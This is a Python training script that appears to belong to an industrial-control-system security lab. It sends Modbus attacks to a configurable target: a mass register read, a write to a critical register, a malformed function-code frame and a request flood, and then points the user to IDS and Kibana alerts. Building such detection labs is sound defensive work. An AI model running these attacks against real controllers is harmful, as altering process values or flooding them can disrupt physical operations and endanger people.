#!/usr/bin/env python3
"""
Railroad North - Modbus Attack Simulation
For training purposes only - demonstrates common ICS attacks
"""

import sys
import time

try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    from pymodbus.client.sync import ModbusTcpClient

MASTER_IP = "172.25.0.10"
MASTER_PORT = 502


def attack_excessive_read(client):
    """ATTACK 1: Excessive register read (data exfiltration)"""
    print("\n[*] Attack 1: Excessive Read Request")
    print("    Attempting to read 1000 registers at once...")
    try:
        result = client.read_holding_registers(0, 1000)
        if hasattr(result, 'registers'):
            print(f"    [!] Read {len(result.registers)} registers - DATA EXFILTRATED")
        else:
            print(f"    [+] Request rejected: {result}")
    except Exception as e:
        print(f"    [+] Request failed (good): {e}")


def attack_critical_write(client):
    """ATTACK 2: Write to critical register"""
    print("\n[*] Attack 2: Write Critical Parameter")
    print("    Attempting to write value 9999 to register 10...")
    try:
        result = client.write_register(10, 9999)
        print(f"    [!] Write result: {result}")
    except Exception as e:
        print(f"    [+] Write blocked: {e}")


def attack_function_probe(client):
    """ATTACK 3: Unsupported function code probe"""
    print("\n[*] Attack 3: Function Code Probe")
    print("    Sending invalid function code 0xFF...")
    try:
        request = b'\x00\x01\x00\x00\x00\x06\x01\xFF\x00\x00\x00\x01'
        client.socket.send(request)
        print("    [!] Malformed frame sent")
    except Exception as e:
        print(f"    [+] Probe failed: {e}")


def attack_dos(client, count=50):
    """ATTACK 4: Denial of Service via rapid requests"""
    print(f"\n[*] Attack 4: DoS - {count} rapid coil reads")
    success = 0
    for i in range(count):
        try:
            client.read_coils(0, 10)
            success += 1
        except Exception:
            pass
        time.sleep(0.01)
    print(f"    Completed: {success}/{count} requests succeeded")


def main():
    print("╔════════════════════════════════════════════════╗")
    print("║   Railroad North - Modbus Attack Simulation    ║")
    print("║   FOR TRAINING PURPOSES ONLY                   ║")
    print("╚════════════════════════════════════════════════╝")
    
    target = sys.argv[1] if len(sys.argv) > 1 else MASTER_IP
    port = int(sys.argv[2]) if len(sys.argv) > 2 else MASTER_PORT
    
    print(f"\nTarget: {target}:{port}")
    
    client = ModbusTcpClient(target, port=port)
    if not client.connect():
        print("[!] Cannot connect to target")
        sys.exit(1)
    
    print("[+] Connected to Modbus server")
    
    attack_excessive_read(client)
    attack_critical_write(client)
    attack_function_probe(client)
    attack_dos(client)
    
    client.close()
    print("\n[*] Attack simulation complete")
    print("[*] Check IDS alerts and Kibana for detections")


if __name__ == '__main__':
    main()
